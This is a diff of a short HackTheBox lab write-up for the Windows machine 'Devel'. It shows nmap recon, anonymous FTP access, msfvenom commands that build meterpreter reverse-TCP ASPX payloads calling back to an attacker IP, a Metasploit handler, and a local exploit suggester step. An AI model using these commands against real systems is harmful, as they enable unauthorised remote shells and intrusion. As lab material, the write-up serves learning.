@@ -1,27 +1,26 @@
-----------------------------------------------------
-# Author -> Shubham Rannpise
-----------------------------------------------------
 # Devel
-# 20/3/2023
+
+
+| Key | Value |
+|-----|-------|
+| Platform | HackTheBox |
+| OS | Windows |
+| Difficulty | Easy |
+
 10.10.10.5
 
-----------------------------------------------------
-# nmap
-----------------------------------------------------
+## Recon
 ```
 PORT   STATE SERVICE VERSION
 21/tcp open  ftp     Microsoft ftpd
 80/tcp open  http    Microsoft IIS httpd 7.5
 
 
-
 └─$ ftp 10.10.10.5    
 anonymous
 
 ```
-----------------------------------------------------
-# exploitation
-----------------------------------------------------
+## Exploitation
 ```
 └─$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.3 LPORT=6969 -f aspx -o exploit.aspx -a x86
 └─$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.3 LPORT=4444 -f aspx > devel.aspx
@@ -34,9 +33,7 @@ msf6 exploit(multi/handler) > run -j
 http://10.10.10.5/exploit.aspx
 we got a shell
 ```
-----------------------------------------------------
-# exploitation
-----------------------------------------------------
+## Exploitation
 ```
 meterpreter > cd Windows\\Temp\\
 use multi/recon/local_exploit_suggester
